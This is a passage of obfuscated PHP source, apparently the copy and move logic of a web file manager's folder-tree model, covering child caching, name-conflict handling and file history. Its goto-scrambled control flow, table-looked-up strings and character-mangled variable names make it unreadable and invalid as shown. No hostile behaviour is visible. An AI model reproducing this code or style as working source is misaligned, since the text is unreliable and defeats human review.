Eë–⁄Øä≥Ë: $Eªæä˘øˆò =& $_SERVER[ú∫]; $AéÓÜ⁄üÉî = $this->sourceInfo($A˜îëëÚ‹ñ); $Aê™±∑êŸ◊ = $this->sourceInfo($aÖ÷î≠Ñ”Ã); goto DÈÉ¥ º¬∆; fèôßπ‹Æˆ: $this->targetIsDelete = intval($AéÓÜ⁄üÉî[$Eªæä˘øˆò[423]]); $EµëÜ®ﬁá≠ = $this->fileNameExistCache($aÖ÷î≠Ñ”Ã, $AéÓÜ⁄üÉî[$Eªæä˘øˆò[28]]); $Fê£ØÀçÉç = $this->_copy($A˜îëëÚ‹ñ, $aÖ÷î≠Ñ”Ã, $CÁˆı·˘…œ, $Eø©úÇñ‚ï, !0, $Fœø äﬁÆ); goto Bªåãıì‹è; aÂ≠¬©õ£å: $this->lockCopyStart($A˜îëëÚ‹ñ); $this->lockWriteStart($aÖ÷î≠Ñ”Ã, $F¯≥©ñù¥Û); $Eø©úÇñ‚ï = array($Eªæä˘øˆò[529] => array(), $Eªæä˘øˆò[530] => array(), $Eªæä˘øˆò[531] => array()); goto fèôßπ‹Æˆ; C∏◊⁄’í¢Œ: if ($AéÓÜ⁄üÉî[$Eªæä˘øˆò[403]] == $Eªæä˘øˆò[87] && $EµëÜ®ﬁá≠ == $Fê£ØÀçÉç) { $this->folderSizeResetChildren($EµëÜ®ﬁá≠); } Model($Eªæä˘øˆò[532])->addAll($Eø©úÇñ‚ï[$Eªæä˘øˆò[530]], array(), !0); if ($EµëÜ®ﬁá≠ != $Fê£ØÀçÉç || $AéÓÜ⁄üÉî[$Eªæä˘øˆò[403]] == $Eªæä˘øˆò[87]) { Model($Eªæä˘øˆò[533])->eventCopy($Fê£ØÀçÉç); } goto Dæâ¡âø¬«; Dæâ¡âø¬«: $this->saveAll($Eø©úÇñ‚ï[$Eªæä˘øˆò[531]]); Model($Eªæä˘øˆò[193])->linkAdd($Eø©úÇñ‚ï[$Eªæä˘øˆò[529]]); $this->folderSizeReset($aÖ÷î≠Ñ”Ã); goto E¬‰åÈ›©é; b˜Õ‰≤èä«: } private function _copy($fÒ—¨¥å…¿, $d ñπ√£éˆ, $Bëã√øƒ÷Â, &$A ∏™÷àÉÁ, $d‚ﬁ¢«Øâ‡, $c©ÔÍ¯Ó¢ä = '') { goto EÈÎ•§¿◊⁄; aÀÆÌÑ∑”: return $a∂ê¶ıá°ß; goto EÀŒëûÊÓ›; DÀÌ‡ö”Ïç: $cüü∫§ÛŸÎ = $c©ÔÍ¯Ó¢ä ? $c©ÔÍ¯Ó¢ä : $eôºÑ”≤Áº[$D“†ÖÃ«π≠[28]]; $DÑı–õäÉÙ = $this->fileNameExistCache($d ñπ√£éˆ, $cüü∫§ÛŸÎ); if ($d‚ﬁ¢«Øâ‡) { $this->_childrenAllMake($fÒ—¨¥å…¿); if ($b€ªıœ»⁄± && $DÑı–õäÉÙ) { $this->_childrenAllMake($DÑı–õäÉÙ); } } goto B‚±ÌÚâ§≠; B‚±ÌÚâ§≠: if (!$DÑı–õäÉÙ) { return $this->_copyCreate($fÒ—¨¥å…¿, $d ñπ√£éˆ, $cüü∫§ÛŸÎ, $A ∏™÷àÉÁ); } $a∂ê¶ıá°ß = $DÑı–õäÉÙ; if ($b€ªıœ»⁄±) { if ($Bëã√øƒ÷Â == REPEAT_RENAME_FOLDER) { $cüü∫§ÛŸÎ = $this->fileNameAutoCache($d ñπ√£éˆ, $cüü∫§ÛŸÎ, $Bëã√øƒ÷Â, $b€ªıœ»⁄±); $a∂ê¶ıá°ß = $this->_copyCreate($fÒ—¨¥å…¿, $d ñπ√£éˆ, $cüü∫§ÛŸÎ, $A ∏™÷àÉÁ); } else { $fË˘ä∏’¶¡ = $this->_childrenList($fÒ—¨¥å…¿); foreach ($fË˘ä∏’¶¡ as $EÀïﬁ…¥Ú∑) { $this->_copy($EÀïﬁ…¥Ú∑[$D“†ÖÃ«π≠[395]], $DÑı–õäÉÙ, $Bëã√øƒ÷Â, $A ∏™÷àÉÁ, !1); } } } else { if ($Bëã√øƒ÷Â == REPEAT_RENAME || $Bëã√øƒ÷Â == REPEAT_RENAME_FOLDER) { $cüü∫§ÛŸÎ = $this->fileNameAutoCache($d ñπ√£éˆ, $cüü∫§ÛŸÎ, $Bëã√øƒ÷Â, $b€ªıœ»⁄±); $a∂ê¶ıá°ß = $this->_copyCreate($fÒ—¨¥å…¿, $d ñπ√£éˆ, $cüü∫§ÛŸÎ, $A ∏™÷àÉÁ); } else { if ($Bëã√øƒ÷Â == REPEAT_REPLACE) { $dçîªÖÂ‰Ê = $this->sourceInfoCache($DÑı–õäÉÙ); $d¬µïµçπ‹ = $this->fileHistory($dçîªÖÂ‰Ê, $eôºÑ”≤Áº[$D“†ÖÃ«π≠[447]], $eôºÑ”≤Áº[$D“†ÖÃ«π≠[78]]); if ($d¬µïµçπ‹) { $A ∏™÷àÉÁ[$D“†ÖÃ«π≠[529]][] = $eôºÑ”≤Áº[$D“†ÖÃ«π≠[447]]; } } else { if ($Bëã√øƒ÷Â == REPEAT_SKIP) { } } } Hook::trigger($D“†ÖÃ«π≠[534], array($D“†ÖÃ«π≠[535], $eôºÑ”≤Áº, 0)); } goto aÀÆÌÑ∑”; EÈÎ•§¿◊⁄: $D“†ÖÃ«π≠ =& $_SERVER[ú∫]; $eôºÑ”≤Áº = $this->sourceInfoCache($fÒ—¨¥å…¿); $b€ªıœ»⁄± = $eôºÑ”≤Áº[$D“†ÖÃ«π≠[403]] == $D“†ÖÃ«π≠[87]; goto DÀÌ‡ö”Ïç; EÀŒëûÊÓ›: } private function _copyCreate($aÍ¶»µû≤°, $dÈµ‘‘Õ∂ª, $EÙ†Ô‡É∞∫, &$E≈⁄∑˘ﬁ√®) { goto eﬁ¬áÑﬁ·Â; fÕ¨ø›õë‹: $this->chunkEventSet($b†åê–ıû‘[543], array($b†åê–ıû‘[544], $BêØàÑ€·Ï, $b£ãô§´æ‹)); $this->saveAll($eÒ›»ıœ©); return $AÎô≠æ≥¨®; goto D¨Ëáü‘ç‰; D∑ƒﬁÈ˜É∏: if ($Aõää¶œ™ÿ[$b†åê–ıû‘[403]] != $b†åê–ıû‘[87]) { $E≈⁄∑˘ﬁ√®[$b†åê–ıû‘[529]][] = $Aõää¶œ™ÿ[$b†åê–ıû‘[447]]; return $AÎô≠æ≥¨®; } $EôÌÿ¶¬Á˘ = array(); $BáÔ˜…ËÀê = array(); goto bõÆﬂÜÆß¯; bõÆﬂÜÆß¯: $this->_childrenListAll($aÍ¶»µû≤°, $EôÌÿ¶¬Á˘); $b£ãô§´æ‹ = count($EôÌÿ¶¬Á˘); if ($b£ãô§´æ‹ == 0) { return $AÎô≠æ≥¨®; } goto cπ–±’Æó±; AåÇ≤ãû…: $this->addAll($BáÔ˜…ËÀê, array(), !1); $cﬂøá≠Ó≠‡ = $this->where(array($b†åê–ıû‘[478] => $AÎô≠æ≥¨®))->select(); $b…¡ÙèÒ≈≥ = $this->_childrenMakeRelation($EôÌÿ¶¬Á˘, $cﬂøá≠Ó≠‡); goto A™’æâÃ¨Ñ; AÜ¶êù◊ÎÁ: $AÎô≠æ≥¨® = $this->add($BêØàÑ€·Ï); $F•˜§»®¿è = array($b†åê–ıû‘[395] => $AÎô≠æ≥¨®, $b†åê–ıû‘[28] => $EÙ†Ô‡É∞∫); $this->_copyApplyMeta($F•˜§»®¿è, $E≈⁄∑˘ﬁ√®); goto D∑ƒﬁÈ˜É∏; cπ–±’Æó±: $eâ›‡ùò ∞ = $this->sourceInfo($AÎô≠æ≥¨®); foreach ($EôÌÿ¶¬Á˘ as $DﬁÊˆ«€œË) { $AåÀ–™ìπÛ = $this->_makeItemData($DﬁÊˆ«€œË, $eâ›‡ùò ∞, $DﬁÊˆ«€œË[$b†åê–ıû‘[28]]); $AåÀ–™ìπÛ[$b†åê–ıû‘[487]] = $DﬁÊˆ«€œË[$b†åê–ıû‘[487]]; $BáÔ˜…ËÀê[] = $AåÀ–™ìπÛ; } $this->chunkEventSet($b†åê–ıû‘[539], array($b†åê–ıû‘[540], $BêØàÑ€·Ï, $b£ãô§´æ‹)); goto AåÇ≤ãû…; FÙ≠∆ Ç¢Ç: foreach ($cﬂøá≠Ó≠‡ as $DﬁÊˆ«€œË) { $a”‡Ñ¬áå« = $DﬁÊˆ«€œË[$b†åê–ıû‘[395]]; $dÓë™π∂ŒÆ = $this->_childrenMatch($b…¡ÙèÒ≈≥, $DﬁÊˆ«€œË, $eâ›‡ùò ∞); $d≈€´Èà≈ÿ[] = array($b†åê–ıû‘[395], $a”‡Ñ¬áå«, $b†åê–ıû‘[478], $dÓë™π∂ŒÆ[$b†åê–ıû‘[478]]); $eÒ›»ıœ©[] = array($b†åê–ıû‘[395], $a”‡Ñ¬áå«, $b†åê–ıû‘[487], $dÓë™π∂ŒÆ[$b†åê–ıû‘[487]]); $this->_copyApplyMeta($DﬁÊˆ«€œË, $E≈⁄∑˘ﬁ√®); if ($DﬁÊˆ«€œË[$b†åê–ıû‘[403]] != $b†åê–ıû‘[87]) { $E≈⁄∑˘ﬁ√®[$b†åê–ıû‘[529]][] = $DﬁÊˆ«€œË[$b†åê–ıû‘[447]]; } } $this->chunkEventSet($b†åê–ıû‘[541], array($b†åê–ıû‘[542], $BêØàÑ€·Ï, $b£ãô§´æ‹)); $this->saveAll($d≈€´Èà≈ÿ); goto fÕ¨ø›õë‹; eﬁ¬áÑﬁ·Â: $b†åê–ıû‘ =& $_SERVER[ú∫]; $Aõää¶œ™ÿ = $this->sourceInfoCache($aÍ¶»µû≤°); $Bª…„ª•ùé = $this->sourceInfoCache($dÈµ‘‘Õ∂ª); goto A»Ê™≥òè; A»Ê™≥òè: $BêØàÑ€·Ï = $this->_makeItemData($Aõää¶œ™ÿ, $Bª…„ª•ùé, $EÙ†Ô‡É∞∫); Hook::trigger($b†åê–ıû‘[536], $BêØàÑ€·Ï); Hook::trigger($b†åê–ıû‘[537], array($b†åê–ıû‘[538], $BêØàÑ€·Ï, 0)); goto AÜ¶êù◊ÎÁ; A™’æâÃ¨Ñ: $b…¡ÙèÒ≈≥[$aÍ¶»µû≤°] = $AÎô≠æ≥¨®; $d≈€´Èà≈ÿ = array(); $eÒ›»ıœ© = array(); goto FÙ≠∆ Ç¢Ç; D¨Ëáü‘ç‰: } private function _childrenMakeRelation($D•ƒº¯©∆•, $EÜ±ëöŸ…£) { $CÚ∞∂»Æÿ∫ =& $_SERVER[ú∫]; $D∏ˆ»ÿÌù› = array(); $D∑™ÔÇó≤† = array(); foreach ($D•ƒº¯©∆• as $DºÂí‡Öêü) { $EÁ˘∂˜ì≈¡ = $DºÂí‡Öêü[$CÚ∞∂»Æÿ∫[28]] . $CÚ∞∂»Æÿ∫[8] . $DºÂí‡Öêü[$CÚ∞∂»Æÿ∫[487]]; $D∏ˆ»ÿÌù›[$EÁ˘∂˜ì≈¡] = $DºÂí‡Öêü[$CÚ∞∂»Æÿ∫[395]]; } foreach ($EÜ±ëöŸ…£ as $DºÂí‡Öêü) { $EÁ˘∂˜ì≈¡ = $DºÂí‡Öêü[$CÚ∞∂»Æÿ∫[28]] . $CÚ∞∂»Æÿ∫[8] . $DºÂí‡Öêü[$CÚ∞∂»Æÿ∫[487]]; $D†€ªÉèé‡ = $D∏ˆ»ÿÌù›[$EÁ˘∂˜ì≈¡]; $D∑™ÔÇó≤†[$D†€ªÉèé‡] = $DºÂí‡Öêü[$CÚ∞∂»Æÿ∫[395]]; } return $D∑™ÔÇó≤†; } private function _childrenMatch($A√¢Éª⁄¨•, $C ‡Ç≈µÉ, $cä¿¡«˜Æú) { goto FìÕÚÑ÷ËÒ; FìÕÚÑ÷ËÒ: $C¬ëâìçéˆ =& $_SERVER[ú∫]; $cûãôõôÆ— = $cä¿¡«˜Æú[$C¬ëâìçéˆ[487]]; $bæŸì¿≥Õ¡ = $this->parentLevelArray($C ‡Ç≈µÉ[$C¬ëâìçéˆ[487]]); goto CÍÿÇå˜êË; CÍÿÇå˜êË: foreach ($bæŸì¿≥Õ¡ as $dêßÒÿÆƒÑ) { if (isset($A√¢Éª⁄¨•[$dêßÒÿÆƒÑ])) { $cûãôõôÆ— .= $A√¢Éª⁄¨•[$dêßÒÿÆƒÑ] . $C¬ëâìçéˆ[545]; } } $cûãôõôÆ— = rtrim($cûãôõôÆ—, $C¬ëâìçéˆ[47]) . $C¬ëâìçéˆ[47]; $e•¯ﬁΩñ€À = $this->parentLevelArray($cûãôõôÆ—); goto A¿Âô∂ üØ; A¿Âô∂ üØ: $b∞…âÔπüÏ = $e•¯ﬁΩñ€À[count($e•¯ﬁΩñ€À) - 1]; return array($C¬ëâìçéˆ[478] => $b∞…âÔπüÏ, $C¬ëâìçéˆ[487] => $cûãôõôÆ—); goto B¨ó≠ΩÀò˜; B¨ó≠ΩÀò˜: } private function _makeItemData($B‡˘®ÜÛ≈é, $D¬÷÷ìÒµÖ, $e⁄é∫Ááâå) { $FªÚÿ«ÌÂë =& $_SERVER[ú∫]; $F´å›⁄àÎÒ = array($FªÚÿ«ÌÂë[546] => $B‡˘®ÜÛ≈é[$FªÚÿ«ÌÂë[403]], $FªÚÿ«ÌÂë[413] => $e⁄é∫Ááâå, $FªÚÿ«ÌÂë[547] => $B‡˘®ÜÛ≈é[$FªÚÿ«ÌÂë[405]], $FªÚÿ«ÌÂë[448] => $B‡˘®ÜÛ≈é[$FªÚÿ«ÌÂë[447]], $FªÚÿ«ÌÂë[548] => $B‡˘®ÜÛ≈é[$FªÚÿ«ÌÂë[78]], $FªÚÿ«ÌÂë[549] => $D¬÷÷ìÒµÖ[$FªÚÿ«ÌÂë[404]], $FªÚÿ«ÌÂë[550] => $D¬÷÷ìÒµÖ[$FªÚÿ«ÌÂë[484]], $FªÚÿ«ÌÂë[551] => USER_ID, $FªÚÿ«ÌÂë[552] => USER_ID, $FªÚÿ«ÌÂë[394] => $D¬÷÷ìÒµÖ[$FªÚÿ«ÌÂë[395]], $FªÚÿ«ÌÂë[553] => $D¬÷÷ìÒµÖ[$FªÚÿ«ÌÂë[487]] . $D¬÷÷ìÒµÖ[$FªÚÿ«ÌÂë[395]] . $FªÚÿ«ÌÂë[47], $FªÚÿ«ÌÂë[417] => $B‡˘®ÜÛ≈é[$FªÚÿ«ÌÂë[84]], $FªÚÿ«ÌÂë[422] => 0, $FªÚÿ«ÌÂë[554] => $FªÚÿ«ÌÂë[33]); return $F´å›⁄àÎÒ; } private function _copyApplyMeta($A‡∏ØÂ´¥í, &$EØﬁ¬ÛìÏŒ) { $AÙÑ ÔÃóé =& $_SERVER[ú∫]; $d∫ﬂô÷ë©¿ = $A‡∏ØÂ´¥í[$AÙÑ ÔÃóé[395]]; $a¿–àıÆÜ– = $A‡∏ØÂ´¥í[$AÙÑ ÔÃóé[28]]; if (!isset($A‡∏ØÂ´¥í[$AÙÑ ÔÃóé[555]]) || !$A‡∏ØÂ´¥í[$AÙÑ ÔÃóé[555]] || $A‡∏ØÂ´¥í[$AÙÑ ÔÃóé[555]] == $AÙÑ ÔÃóé[191]) { $EØﬁ¬ÛìÏŒ[$AÙÑ ÔÃóé[531]][] = array($AÙÑ ÔÃóé[395], $d∫ﬂô÷ë©¿, $AÙÑ ÔÃóé[555], short_id($d∫ﬂô÷ë©¿)); } if (Input::check($a¿–àıÆÜ–, $AÙÑ ÔÃóé[556])) { $EØﬁ¬ÛìÏŒ[$AÙÑ ÔÃóé[530]][] = array($AÙÑ ÔÃóé[395] => $d∫ﬂô÷ë©¿, $AÙÑ ÔÃóé[93] => $AÙÑ ÔÃóé[444], $AÙÑ ÔÃóé[372] => str_replace($AÙÑ ÔÃóé[50], $AÙÑ ÔÃóé[33], Pinyin::encode($a¿–àıÆÜ–))); $EØﬁ¬ÛìÏŒ[$AÙÑ ÔÃóé[530]][] = array($AÙÑ ÔÃóé[395] => $d∫ﬂô÷ë©¿, $AÙÑ ÔÃóé[93] => $AÙÑ ÔÃóé[443], $AÙÑ ÔÃóé[372] => Pinyin::encode($a¿–àıÆÜ–, $AÙÑ ÔÃóé[557])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($DêÁ¯•™çÇ) { goto B–ÙïÆËÜˆ; DÒÍÓ¢ãÁ: $CƒÀù°˜∑Ç = array_to_keyvalue($CƒÀù°˜∑Ç, $c∂Ñå„ºÕü[395]); foreach ($CƒÀù°˜∑Ç as $fï√ıâ√åÇ) { $a‡Ûü≈∆° = $fï√ıâ√åÇ[$c∂Ñå„ºÕü[478]]; $DêÁ¯•™çÇ = $fï√ıâ√åÇ[$c∂Ñå„ºÕü[395]]; if (!isset($this->_childrenListCache[$DêÁ¯•™çÇ]) && $fï√ıâ√åÇ[$c∂Ñå„ºÕü[403]] == $c∂Ñå„ºÕü[87]) { $this->_childrenListCache[$DêÁ¯•™çÇ] = array(); } if (!isset($this->_childrenListCache[$a‡Ûü≈∆°])) { $this->_childrenListCache[$a‡Ûü≈∆°] = array(); } $this->_childrenListCache[$a‡Ûü≈∆°][$DêÁ¯•™çÇ] = $fï√ıâ√åÇ; $this->_childrenItemCache[$DêÁ¯•™çÇ] = $fï√ıâ√åÇ; } goto A∫√‰âêéä; c◊—ÿÉ°¬: $A¬ùôÌÃ≤â = array($c∂Ñå„ºÕü[487] => array($c∂Ñå„ºÕü[512], $cü÷ùòÖù[$c∂Ñå„ºÕü[487]] . $DêÁ¯•™çÇ . $c∂Ñå„ºÕü[513]), $c∂Ñå„ºÕü[423] => $this->targetIsDelete); $CƒÀù°˜∑Ç = $this->field($eùÇìêôä’)->where($A¬ùôÌÃ≤â)->select(); if (!$CƒÀù°˜∑Ç) { return; } goto DÒÍÓ¢ãÁ; B–ÙïÆËÜˆ: $c∂Ñå„ºÕü =& $_SERVER[ú∫]; $cü÷ùòÖù = $this->sourceInfo($DêÁ¯•™çÇ); $eùÇìêôä’ = $c∂Ñå„ºÕü[424]; goto c◊—ÿÉ°¬; A∫√‰âêéä: } private function _childrenListAll($D™»’ﬁ†∑≥, &$dá∂µ‡…êˆ) { $d˘±⁄ì¶“ =& $_SERVER[ú∫]; if (!isset($this->_childrenListCache[$D™»’ﬁ†∑≥])) { return; } $e≠ªï€ËÁö = $this->_childrenListCache[$D™»’ﬁ†∑≥]; foreach ($e≠ªï€ËÁö as $D¿‡—“ü‡Ô => $AåÉ¿Æç«œ) { $dá∂µ‡…êˆ[$D¿‡—“ü‡Ô] = $AåÉ¿Æç«œ; if ($AåÉ¿Æç«œ[$d˘±⁄ì¶“[403]] == $d˘±⁄ì¶“[87]) { $this->_childrenListAll($D¿‡—“ü‡Ô, $dá∂µ‡…êˆ); } } } private function sourceInfoCache($FÌÿÒ⁄É®) { if (isset($this->_childrenItemCache[$FÌÿÒ⁄É®])) { return $this->_childrenItemCache[$FÌÿÒ⁄É®]; } return $this->sourceInfo($FÌÿÒ⁄É®); } private function _childrenList($a•Àóõ‡Üê) { if (isset($this->_childrenListCache[$a•Àóõ‡Üê])) { return $this->_childrenListCache[$a•Àóõ‡Üê]; } return $this->_childrenListSelect($a•Àóõ‡Üê); } private function _childrenListSelect($B·Œìöñ‰∏) { goto f•±” è°ã; Dπ‰»°¡û≈: $BÙæ·ÕˆÑí = $BÙæ·ÕˆÑí ? $BÙæ·ÕˆÑí : array(); $aúπ…›§äç = array_to_keyvalue($BÙæ·ÕˆÑí, $C¬üÃ‚ã∂Ú[395]); $this->_childrenListCache[$B·Œìöñ‰∏] = $aúπ…›§äç; goto aøùó·û‹Ò; f•±” è°ã: $C¬üÃ‚ã∂Ú =& $_SERVER[ú∫]; $Få’„ä‡—’ = array($C¬üÃ‚ã∂Ú[478] => $B·Œìöñ‰∏, $C¬üÃ‚ã∂Ú[423] => $this->targetIsDelete); $BÙæ·ÕˆÑí = $this->where($Få’„ä‡—’)->select(); goto Dπ‰»°¡û≈; aøùó·û‹Ò: foreach ($aúπ…›§äç as $B·Œìöñ‰∏ => $dÑÚÓ°Á¢≥) { $this->_childrenItemCache[$B·Œìöñ‰∏] = $dÑÚÓ°Á¢≥; } return $aúπ…›§äç; goto a—Û¯Ü∞øü; a—Û¯Ü∞øü: } private function fileNameExistCache($d§‹◊»—¨º, $CΩ°ä‡¿¬ë) { $cØÙµ≤€Õ¢ =& $_SERVER[ú∫]; $CΩ°ä‡¿¬ë = strtolower($CΩ°ä‡¿¬ë); $AÜèéÓ≠Õº = $this->_childrenList($d§‹◊»—¨º); foreach ($AÜèéÓ≠Õº as $Eâÿß≥«ê©) { if ($CΩ°ä‡¿¬ë == strtolower($Eâÿß≥«ê©[$cØÙµ≤€Õ¢[28]])) { return $Eâÿß≥«ê©[$cØÙµ≤€Õ¢[395]]; } } return !1; } private function fileNameAutoCache($a‰Êÿâﬁ∂∑, $cØ§Ü±¬ﬁê, $F¢ÉêÁﬂÑ™, $CöÓ–≥á’≠) { $fˆÇá±‹Ê∫ =& $_SERVER[ú∫]; $Dﬁã˜ÿ±ïΩ = $this->_childrenList($a‰Êÿâﬁ∂∑); $A≤◊Çåí í = array_to_keyvalue($Dﬁã˜ÿ±ïΩ, $fˆÇá±‹Ê∫[33], $fˆÇá±‹Ê∫[28]); return $this->fileNameAutoGet($A≤◊Çåí í, $cØ§Ü±¬ﬁê, $F¢ÉêÁﬂÑ™, $CöÓ–≥á’≠); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Aëù’”Ê≠•, $C°àÜŸﬁÒÀ, $c‰áìøíá“ = REPEAT_REPLACE, $b¢¶’óÍ£Ê = '') { goto c≤‹´òÑ§ﬂ; FúªÔÖ∆Ø∂: $this->updateModifyTime($Béå¨ïÆ≈È); Model($fñ‰“îÏè∏[533])->eventMove($Aëù’”Ê≠•, $b“©”§±üô[$fñ‰“îÏè∏[478]], $C°àÜŸﬁÒÀ); Hook::trigger($fñ‰“îÏè∏[559], $C∂Û»œ‰‹°); goto aﬁí⁄Â¢ë«; BóñÛê•µÍ: $this->lockWriteStart($C°àÜŸﬁÒÀ, $E€÷£Ù·ﬂò); $f·∆ÁëŸºπ = array($fñ‰“îÏè∏[529] => array(), $fñ‰“îÏè∏[560] => !1); $this->clearShare($Aëù’”Ê≠•, $C°àÜŸﬁÒÀ); goto cÒõÁ·πÔ´; cÒõÁ·πÔ´: $b√ûéÖáô– = $this->fileNameExistCache($C°àÜŸﬁÒÀ, $b“©”§±üô[$fñ‰“îÏè∏[28]]); $E…µﬂ¬çÒü = $this->_move($Aëù’”Ê≠•, $C°àÜŸﬁÒÀ, $c‰áìøíá“, $f·∆ÁëŸºπ, $b¢¶’óÍ£Ê); $this->sourceCacheClear(); goto bÍÂΩéÓˆ÷; aﬁí⁄Â¢ë«: return $E…µﬂ¬çÒü; goto dî≠ä‚íÊ·; Båµäº⁄≈Ü: if ($b“©”§±üô[$fñ‰“îÏè∏[478]] == $B•ìŸ–Ì™ò[$fñ‰“îÏè∏[395]]) { if ($b“©”§±üô[$fñ‰“îÏè∏[423]] == $fñ‰“îÏè∏[87]) { Model($fñ‰“îÏè∏[421])->restore(array($Aëù’”Ê≠•)); } if (!$b¢¶’óÍ£Ê || $b¢¶’óÍ£Ê == $b“©”§±üô[$fñ‰“îÏè∏[28]]) { return $Aëù’”Ê≠•; } } $C∂Û»œ‰‹° = $this->pathInfoMore($Aëù’”Ê≠•); if ($this->isParentOf($Aëù’”Ê≠•, $C°àÜŸﬁÒÀ)) { return !1; } goto A˜«®Ö´È; A˜«®Ö´È: if (!$b“©”§±üô || !$B•ìŸ–Ì™ò || $B•ìŸ–Ì™ò[$fñ‰“îÏè∏[403]] != $fñ‰“îÏè∏[87]) { return !1; } Hook::trigger($fñ‰“îÏè∏[558], $C∂Û»œ‰‹°); $this->targetIsDelete = intval($b“©”§±üô[$fñ‰“îÏè∏[423]]); goto a“Ü””¬¯ó; c≤‹´òÑ§ﬂ: $fñ‰“îÏè∏ =& $_SERVER[ú∫]; $b“©”§±üô = $this->sourceInfo($Aëù’”Ê≠•); $B•ìŸ–Ì™ò = $this->sourceInfo($C°àÜŸﬁÒÀ); goto Båµäº⁄≈Ü; E˜Úìôâ’‡: $this->lockMoveEnd($Aëù’”Ê≠•); $this->lockWriteEnd($C°àÜŸﬁÒÀ, $E€÷£Ù·ﬂò); $this->folderSizeReset($b“©”§±üô[$fñ‰“îÏè∏[478]]); goto bµ∆Óî∏≥; bÍÂΩéÓˆ÷: if ($b“©”§±üô[$fñ‰“îÏè∏[403]] == $fñ‰“îÏè∏[87] && $b√ûéÖáô–) { $this->folderSizeResetChildren($E…µﬂ¬çÒü); } Model($fñ‰“îÏè∏[193])->linkAdd($f·∆ÁëŸºπ[$fñ‰“îÏè∏[529]]); if ($b√ûéÖáô– && $f·∆ÁëŸºπ[$fñ‰“îÏè∏[560]]) { $this->removeNow($Aëù’”Ê≠•, !1); } goto E˜Úìôâ’‡; bµ∆Óî∏≥: $this->folderSizeReset($C°àÜŸﬁÒÀ); $Béå¨ïÆ≈È = array($b“©”§±üô[$fñ‰“îÏè∏[478]], $C°àÜŸﬁÒÀ); if ($b“©”§±üô[$fñ‰“îÏè∏[403]] == $fñ‰“îÏè∏[87]) { $Béå¨ïÆ≈È[] = $Aëù’”Ê≠•; } goto FúªÔÖ∆Ø∂; a“Ü””¬¯ó: if ($b“©”§±üô[$fñ‰“îÏè∏[478]] == $C°àÜŸﬁÒÀ && $b¢¶’óÍ£Ê != $b“©”§±üô[$fñ‰“îÏè∏[28]]) { $BÏ¢∆Á∞êè = $this->fileNameExist($C°àÜŸﬁÒÀ, $b¢¶’óÍ£Ê); if ($BÏ¢∆Á∞êè && $b“©”§±üô[$fñ‰“îÏè∏[403]] == $fñ‰“îÏè∏[191]) { goto DÀÇ˘≤ˆ«ì; bÛ’ù©ì ä: return $BÏ¢∆Á∞êè; goto F∫’úø∆óª; DÀÇ˘≤ˆ«ì: $Aø∞áﬁüÜÌ = $this->sourceInfo($BÏ¢∆Á∞êè); $F®¿©∑ëƒ¢ = $this->fileHistory($Aø∞áﬁüÜÌ, $b“©”§±üô[$fñ‰“îÏè∏[447]], $b“©”§±üô[$fñ‰“îÏè∏[78]]); if (!$F®¿©∑ëƒ¢) { Model($fñ‰“îÏè∏[450])->remove($b“©”§±üô[$fñ‰“îÏè∏[447]]); } goto E∑≤ö√Ô®–; E∑≤ö√Ô®–: $this->removeNow($Aëù’”Ê≠•, !1); $this->folderSizeReset($C°àÜŸﬁÒÀ); Hook::trigger($fñ‰“îÏè∏[559], $C∂Û»œ‰‹°); goto bÛ’ù©ì ä; F∫’úø∆óª: } } $E€÷£Ù·ﬂò = $b¢¶’óÍ£Ê ? $b¢¶’óÍ£Ê : $b“©”§±üô[$fñ‰“îÏè∏[28]]; $this->lockMoveStart($Aëù’”Ê≠•); goto BóñÛê•µÍ; dî≠ä‚íÊ·: } private function _move($E®˘‘≈á≤∂, $b∫¯ÖÖÖª≠, $D Í¢÷Ü¿å, &$C∆Ω‚≤®Ò‰, $D…™îëœÎè = '') { goto A·Ë›∆¿ì∏; Bøà˘ΩˆïÍ: $this->lockWriteStart($b∫¯ÖÖÖª≠, $cë”‹áùºµ); if (!$eãèé‡‹Ü) { return $this->_moveForce($E®˘‘≈á≤∂, $b∫¯ÖÖÖª≠, $cë”‹áùºµ); } $dæ∆ŒÒæ»≥ = $eãèé‡‹Ü; goto BﬁãÎŒç¶«; BﬁãÎŒç¶«: $Búã‘á«¥Ì = !1; if ($fá¨“÷ë¶) { if ($D Í¢÷Ü¿å == REPEAT_RENAME_FOLDER) { $cë”‹áùºµ = $this->fileNameAuto($b∫¯ÖÖÖª≠, $cë”‹áùºµ, $D Í¢÷Ü¿å, $fá¨“÷ë¶); $dæ∆ŒÒæ»≥ = $this->_moveForce($E®˘‘≈á≤∂, $b∫¯ÖÖÖª≠, $cë”‹áùºµ); } else { if ($D Í¢÷Ü¿å == REPEAT_RENAME_FOLDER) { $D Í¢÷Ü¿å = REPEAT_RENAME; } $F ñ•¬ô∏ë = $this->_childrenListSelect($E®˘‘≈á≤∂); foreach ($F ñ•¬ô∏ë as $B±êÍÁ≤ï§) { $this->_move($B±êÍÁ≤ï§[$A°èõÔËÍÊ[395]], $eãèé‡‹Ü, $D Í¢÷Ü¿å, $C∆Ω‚≤®Ò‰); } $Búã‘á«¥Ì = !0; } } else { if ($D Í¢÷Ü¿å == REPEAT_SKIP) { $Búã‘á«¥Ì = !0; } else { if ($D Í¢÷Ü¿å == REPEAT_RENAME || $D Í¢÷Ü¿å == REPEAT_RENAME_FOLDER) { $cë”‹áùºµ = $this->fileNameAuto($b∫¯ÖÖÖª≠, $cë”‹áùºµ, $D Í¢÷Ü¿å, $fá¨“÷ë¶); $dæ∆ŒÒæ»≥ = $this->_moveForce($E®˘‘≈á≤∂, $b∫¯ÖÖÖª≠, $cë”‹áùºµ); } else { if ($D Í¢÷Ü¿å == REPEAT_REPLACE) { $eÚûÒæÏíº = $this->sourceInfoCache($eãèé‡‹Ü); $AØá∂åè¢  = $this->fileHistory($eÚûÒæÏíº, $e¥¨Éƒå«ﬂ[$A°èõÔËÍÊ[447]], $e¥¨Éƒå«ﬂ[$A°èõÔËÍÊ[78]]); if ($AØá∂åè¢ ) { $C∆Ω‚≤®Ò‰[$A°èõÔËÍÊ[529]][] = $e¥¨Éƒå«ﬂ[$A°èõÔËÍÊ[447]]; } else { $Búã‘á«¥Ì = !0; } } } } } if ($Búã‘á«¥Ì && !$C∆Ω‚≤®Ò‰[$A°èõÔËÍÊ[560]]) { $C∆Ω‚≤®Ò‰[$A°èõÔËÍÊ[560]] = !0; } goto dπ·¯›–ÊÈ; A·Ë›∆¿ì∏: 